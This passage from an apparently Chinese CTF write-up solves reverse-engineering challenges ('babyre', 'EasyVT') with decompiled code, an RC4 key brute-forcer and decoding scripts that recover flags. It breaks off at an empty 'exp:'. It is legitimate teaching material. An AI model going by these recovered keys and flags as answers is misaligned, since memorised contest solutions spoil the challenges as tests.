class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROL</span>(<span class="params">int_value, k, bit=<span class="number">64</span></span>):</span><br><span class="line">	bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit</span><br><span class="line"></span><br><span class="line">	bin_value = bit_string.<span class="built_in">format</span>(int_value)  <span class="comment"># 8 bit binary</span></span><br><span class="line"></span><br><span class="line">	bin_value = bin_value[k:] + bin_value[:k]</span><br><span class="line"></span><br><span class="line">	int_value = <span class="built_in">int</span>(bin_value, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># right circular shift</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROR</span>(<span class="params">int_value, k, bit=<span class="number">64</span></span>):</span><br><span class="line">	bit_string = <span class="string">&#x27;&#123;:0%db&#125;&#x27;</span> % bit</span><br><span class="line"></span><br><span class="line">	bin_value = bit_string.<span class="built_in">format</span>(int_value)  <span class="comment"># 8 bit binary</span></span><br><span class="line"></span><br><span class="line">	bin_value = bin_value[-k:] + bin_value[:-k]</span><br><span class="line"></span><br><span class="line">	int_value = <span class="built_in">int</span>(bin_value, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># magic = [0x04,0x77,0x82,0x4a]</span></span><br><span class="line">magic = <span class="number">0x4a8277044a827704</span></span><br><span class="line">enc = [<span class="number">0x549941E4E20F4FAA</span>, <span class="number">0x788B8FBC7E842B2C</span>, <span class="number">0x708547AE5E8873D3</span>, <span class="number">0xCA0DF513CE09B331</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">	enc[i] ^= magic</span><br><span class="line">enc[<span class="number">0</span>] = ROR(enc[<span class="number">0</span>],<span class="number">12</span>)</span><br><span class="line">enc[<span class="number">1</span>] = ROR(enc[<span class="number">1</span>],<span class="number">34</span>)</span><br><span class="line">enc[<span class="number">2</span>] = ROR(enc[<span class="number">2</span>],<span class="number">56</span>)</span><br><span class="line">enc[<span class="number">3</span>] = ROR(enc[<span class="number">3</span>],<span class="number">14</span>)</span><br><span class="line">magic2 = <span class="number">0x3ca7259d</span></span><br><span class="line">raw = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(enc[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	raw += long_to_bytes(((enc[i] &amp; <span class="number">0xffffffff</span>) - magic2 ) % <span class="number">0x100000000</span>)[::-<span class="number">1</span>]</span><br><span class="line">	raw += long_to_bytes(((enc[i] &gt;&gt; <span class="number">32</span>) - (magic2 ^(enc[i] &amp; <span class="number">0xffffffff</span>))  )% <span class="number">0x100000000</span>)[::-<span class="number">1</span>]</span><br><span class="line">	magic2 ^= enc[i] &amp; <span class="number">0xffffffff</span></span><br><span class="line">	magic2 ^= enc[i] &gt;&gt; <span class="number">32</span></span><br><span class="line"><span class="built_in">print</span>(raw)</span><br><span class="line"><span class="comment"># 0x7d5549941e4e20f4</span></span><br><span class="line"><span class="comment"># 0x1e4e20f4</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p>所有逻辑在<code>initterm_e</code>里面</p>
<p><code>initterm_e</code>可以看作<code>init_array</code></p>
<p>有三个函数，同时按顺序注册了退出函数</p>
<p>第一个函数，限制了输入范围在<code>[0-9]</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub_4025A0(<span class="string">&quot;Input:&quot;</span>, v2);</span><br><span class="line">sub_402620(<span class="string">&quot;%99s&quot;</span>, (<span class="type">char</span>)Str);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt; <span class="string">&#x27;0&#x27;</span> || Str[i] &gt; <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第二个函数 取反了magic，即变成了”012345678”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">    magic1[i] = ~magic1[i];</span><br></pre></td></tr></table></figure>

<p>第三个函数hook了<code>GetLastError</code>，执行了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(magic2, <span class="string">&quot;dcbahgfelkjiponm&quot;</span>, <span class="keyword">sizeof</span>(magic2));</span><br></pre></td></tr></table></figure>

<p>退出的第一个函数，做了类似base64的编码，base8，每三个字节编码到8个字节，将<code>[16:112]</code>的加密结果进行比对，即知道了<code>[6:42]</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base8_encode(Str, (<span class="type">int</span>)&amp;unk_4081C0);</span><br><span class="line">result = <span class="built_in">memcmp</span>(&amp;unk_4081D0, a16230465152334, <span class="number">96u</span>);<span class="comment">// 915572239428449843076691286116796614</span></span><br></pre></td></tr></table></figure>

<p>退出的第二个函数，将编码后的结果进行魔改的SHA1? 计算，但是跑一下很久，很奇怪？</p>
<p>退出的第三个函数，RC4加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rc4_init((sbox, (<span class="type">int</span>)&amp;unk_408182, <span class="number">6u</span>);</span><br><span class="line">rc4_crypt(sbox, (<span class="type">int</span>)&amp;unk_4084C0, <span class="number">112u</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;unk_4084C0, byte_408090, <span class="number">112u</span>) )</span><br><span class="line">  ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这里的<code>dword_408182</code>正好是输入的字符串<code>str[42:48]</code></p>
<p>爆rc4密钥反推前6个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//char k[256]=&#123;0&#125;;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> k[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i]=i;</span><br><span class="line">        k[i]=key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s,<span class="type">unsigned</span> <span class="type">char</span>*Data,<span class="type">unsigned</span> <span class="type">long</span> Len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++)</span><br><span class="line">    &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp=s[i];</span><br><span class="line">        s[i]=s[j];<span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j]=tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k]^=s[t];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> payload[<span class="number">112</span>] = &#123;<span class="string">&quot;1423106315032466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> final[<span class="number">112</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> cipher[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x95</span>, <span class="number">0xBB</span>, <span class="number">0xF2</span>, <span class="number">0x57</span>, <span class="number">0xF1</span>, <span class="number">0x7A</span>, <span class="number">0x5A</span>, <span class="number">0x22</span>, <span class="number">0x61</span>, </span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x43</span>, <span class="number">0xA2</span>, <span class="number">0xFA</span>, <span class="number">0x9B</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x63</span>, <span class="number">0xC0</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x12</span>, <span class="number">0x65</span>, <span class="number">0x5C</span>, <span class="number">0x8A</span>, <span class="number">0x8C</span>, <span class="number">0x4C</span>, <span class="number">0xED</span>, <span class="number">0x5E</span>, <span class="number">0xCA</span>, <span class="number">0x76</span>, </span><br><span class="line">  <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xAF</span>, <span class="number">0x05</span>, <span class="number">0x38</span>, <span class="number">0xED</span>, <span class="number">0x42</span>, <span class="number">0x3E</span>, <span class="number">0x42</span>, <span class="number">0xDF</span>, </span><br><span class="line">  <span class="number">0x5D</span>, <span class="number">0xBE</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0xF3</span>, <span class="number">0x1C</span>, <span class="number">0xCF</span>, <span class="number">0xF8</span>, </span><br><span class="line">  <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x25</span>, <span class="number">0xE4</span>, <span class="number">0xB7</span>, <span class="number">0xB9</span>, <span class="number">0x36</span>, <span class="number">0xFB</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, </span><br><span class="line">  <span class="number">0xA0</span>, <span class="number">0xF0</span>, <span class="number">0x57</span>, <span class="number">0xAB</span>, <span class="number">0x21</span>, <span class="number">0xC6</span>, <span class="number">0xC7</span>, <span class="number">0x46</span>, <span class="number">0x99</span>, <span class="number">0xBD</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x5E</span>, <span class="number">0xEE</span>, <span class="number">0x55</span>, <span class="number">0x18</span>, <span class="number">0xEE</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0x84</span>, </span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0x94</span>, <span class="number">0x5F</span>, <span class="number">0xB4</span>, <span class="number">0x6A</span>, <span class="number">0x29</span>, <span class="number">0xD8</span>, <span class="number">0x6C</span>, <span class="number">0xE4</span>, <span class="number">0xC0</span>, </span><br><span class="line">  <span class="number">0x9D</span>, <span class="number">0x6B</span>, <span class="number">0xCC</span>, <span class="number">0xD5</span>, <span class="number">0x94</span>, <span class="number">0x5C</span>, <span class="number">0xDD</span>, <span class="number">0xCC</span>, <span class="number">0xD5</span>, <span class="number">0x3D</span>, </span><br><span class="line">  <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0xE5</span>, <span class="number">0xB0</span>, <span class="number">0x93</span>, <span class="number">0xF1</span>, <span class="number">0xB3</span>, <span class="number">0xDE</span>, </span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0x70</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">7</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="comment">// printf(&quot;%06d\n&quot;,i);</span></span><br><span class="line">        <span class="built_in">sprintf</span>(buffer,<span class="string">&quot;%06d&quot;</span>,i);</span><br><span class="line">        <span class="type">char</span> sbox[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">char</span> raw[<span class="number">112</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">memcpy</span>(raw,payload,<span class="number">112</span>);</span><br><span class="line">        rc4_init(sbox,buffer,<span class="number">6</span>);</span><br><span class="line">        rc4_crypt(sbox,(<span class="type">unsigned</span> <span class="type">char</span>*)raw,<span class="number">112</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">memcmp</span>(raw + <span class="number">16</span>,cipher +<span class="number">16</span>,<span class="number">0x60</span>))&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);</span><br><span class="line">            rc4_init(sbox,buffer,<span class="number">6</span>);</span><br><span class="line">            rc4_crypt(sbox,cipher,<span class="number">112</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,cipher);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到正确的结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">807391</span></span><br><span class="line"><span class="number">1523306115230466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464</span></span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">magic = [<span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xCD</span>, <span class="number">0xCC</span>, <span class="number">0xCB</span>, <span class="number">0xCA</span>, <span class="number">0xC9</span>, <span class="number">0xC8</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(magic)):</span><br><span class="line">	magic[i] = <span class="number">255</span> - magic[i]</span><br><span class="line"><span class="built_in">print</span>(magic)</span><br><span class="line">p = <span class="string">&quot;&quot;</span></span><br><span class="line">sb = <span class="string">&quot;1523306115230466162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span></span><br><span class="line"><span class="comment"># sb = &quot;162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(sb)):</span><br><span class="line">	p += <span class="built_in">bin</span>(<span class="built_in">int</span>(sb[i]))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(p),<span class="number">8</span>):</span><br><span class="line">	flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(p[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># 561516915572239428449843076691286116796614807391</span></span><br><span class="line"><span class="comment"># 807391</span></span><br></pre></td></tr></table></figure>

<h3 id="EasyVT"><a href="#EasyVT" class="headerlink" title="EasyVT"></a>EasyVT</h3><p>驱动部分打开了VT虚拟机，在<code>sub_401C90</code>是<code>#VMExit</code>的处理函数。美化后如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401C90</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> VM_EXIT_INSTRUCTION_LEN; <span class="comment">// [esp+4h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> VM_EXIT_REASON; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  VM_EXIT_REASON = vm_read(<span class="number">0x4402</span>);</span><br><span class="line">  VM_EXIT_INSTRUCTION_LEN = vm_read(<span class="number">0x440C</span>);</span><br><span class="line">  guest_eflags = vm_read(<span class="number">26656</span>);</span><br><span class="line">  guest_esp = vm_read(<span class="number">26652</span>);</span><br><span class="line">  guest_eip = vm_read(<span class="number">0x681E</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( VM_EXIT_REASON )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:                                    <span class="comment">// CPUID</span></span><br><span class="line">      handler_CPUID();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">18</span>:                                    <span class="comment">// VMCALL</span></span><br><span class="line">      handler_VMCALL();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">19</span>:                                    <span class="comment">// VMCLEAR</span></span><br><span class="line">      sub_F89DB2B0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">20</span>:                                    <span class="comment">// VMLAUNCH</span></span><br><span class="line">      sub_F89DB450();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">21</span>:                                    <span class="comment">// VMPTRLD</span></span><br><span class="line">      sub_F89DB7B0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">22</span>:                                    <span class="comment">// VMPTRST</span></span><br><span class="line">      tea_init();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">23</span>:                                    <span class="comment">// VMREAD</span></span><br><span class="line">      sub_F89DB970();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">24</span>:                                    <span class="comment">// VMRESUME TEA</span></span><br><span class="line">      tea_enc();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">25</span>:                                    <span class="comment">// VMWRITE，这条才是真正的初始化，VMXON,VMCLEAR dont&#x27;care</span></span><br><span class="line">                                                <span class="comment">// 但是VMLAUNCH又要初始化一遍RC4 Key</span></span><br><span class="line">      sub_F89DBA90();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">26</span>:                                    <span class="comment">// VMXOFF</span></span><br><span class="line">      cmp();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">27</span>:                                    <span class="comment">// VMXON</span></span><br><span class="line">      sub_F89DB610();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">28</span>:                                    <span class="comment">// Control-register accesses. </span></span><br><span class="line">      sub_F89DB1D0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  vmwrite(<span class="number">0x681E</span>, VM_EXIT_INSTRUCTION_LEN + guest_eip);</span><br><span class="line">  vmwrite(<span class="number">0x681C</span>, guest_esp);</span><br><span class="line">  <span class="keyword">return</span> vmwrite(<span class="number">0x6820</span>, guest_eflags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个处理函数的上层用于设置和恢复环境，<code>vmresume</code>会恢复到虚拟机执行的位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:F89DBC10                 mov     _guest_eax, eax</span><br><span class="line">.text:F89DBC15                 mov     guest_ecx, ecx</span><br><span class="line">.text:F89DBC1B                 mov     guest_edx, edx</span><br><span class="line">.text:F89DBC21                 mov     guest_ebx, ebx</span><br><span class="line">.text:F89DBC27                 mov     guest_esp, esp</span><br><span class="line">.text:F89DBC2D                 mov     guest_ebp, ebp</span><br><span class="line">.text:F89DBC33                 mov     guest_esi, esi</span><br><span class="line">.text:F89DBC39                 mov     guest_edi, edi</span><br><span class="line">.text:F89DBC3F                 pushf</span><br><span class="line">.text:F89DBC40                 pop     eax</span><br><span class="line">.text:F89DBC41                 mov     guest_eflags, eax</span><br><span class="line">.text:F89DBC46                 mov     ax, fs</span><br><span class="line">.text:F89DBC49                 mov     fs, ax</span><br><span class="line">.text:F89DBC4C                 mov     ax, gs</span><br><span class="line">.text:F89DBC4F                 mov     gs, ax</span><br><span class="line">.text:F89DBC52                 call    sub_F89DBC90</span><br><span class="line">.text:F89DBC57                 mov     eax, _guest_eax</span><br><span class="line">.text:F89DBC5C                 mov     ecx, guest_ecx</span><br><span class="line">.text:F89DBC62                 mov     edx, guest_edx</span><br><span class="line">.text:F89DBC68                 mov     ebx, guest_ebx</span><br><span class="line">.text:F89DBC6E                 mov     esp, guest_esp</span><br><span class="line">.text:F89DBC74                 mov     ebp, guest_ebp</span><br><span class="line">.text:F89DBC7A                 mov     esi, guest_esi</span><br><span class="line">.text:F89DBC80                 mov     edi, guest_edi</span><br><span class="line">.text:F89DBC86                 vmresume</span><br></pre></td></tr></table></figure>

<p>应用程序方面，由于已经在虚拟机内了，执行这些虚拟化指令均会导致<code>#VMExit</code>，执行上述处理函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:00401111 loc_401111:                             ; CODE XREF: _main+97↓j</span><br><span class="line">.text:00401111                 mov     eax, [ebp-0Ch]</span><br><span class="line">.text:00401114                 add     eax, 1</span><br><span class="line">.text:00401117                 mov     [ebp-0Ch], eax</span><br><span class="line">.text:0040111A</span><br><span class="line">.text:0040111A loc_40111A:                             ; CODE XREF: _main+4F↑j</span><br><span class="line">.text:0040111A                 cmp     dword ptr [ebp-0Ch], 4</span><br><span class="line">.text:0040111E                 jge     short loc_401159</span><br><span class="line">.text:00401120                 mov     eax, offset Buffer</span><br><span class="line">.text:00401125                 mov     ecx, [ebp-0Ch]</span><br><span class="line">.text:00401128                 mov     esi, [eax+ecx*8]</span><br><span class="line">.text:0040112B                 mov     edi, [eax+ecx*8+4]</span><br><span class="line">.text:0040112F                 vmxon   [esp+0DCh+var_DC]</span><br><span class="line">.text:00401134                 vmclear [esp+0DCh+var_DC]</span><br><span class="line">.text:00401139                 vmptrld [esp+0DCh+var_DC]</span><br><span class="line">.text:0040113D                 vmwrite eax, ecx</span><br><span class="line">.text:00401140                 vmlaunch</span><br><span class="line">.text:00401143                 vmread  ecx, eax</span><br><span class="line">.text:00401146                 vmcall</span><br><span class="line">.text:00401149                 vmptrst [esp+0DCh+var_DC]</span><br><span class="line">.text:0040114D                 vmresume</span><br><span class="line">.text:00401150                 vmxoff</span><br><span class="line">.text:00401153                 test    eax, eax</span><br><span class="line">.text:00401155                 jz      short loc_40116A</span><br><span class="line">.text:00401157                 jmp     short loc_401111</span><br></pre></td></tr></table></figure>

<p>所以按执行顺序分析<code>#VMExit</code> 的<code>Handler</code>即可。</p>
<p>exp:</p>
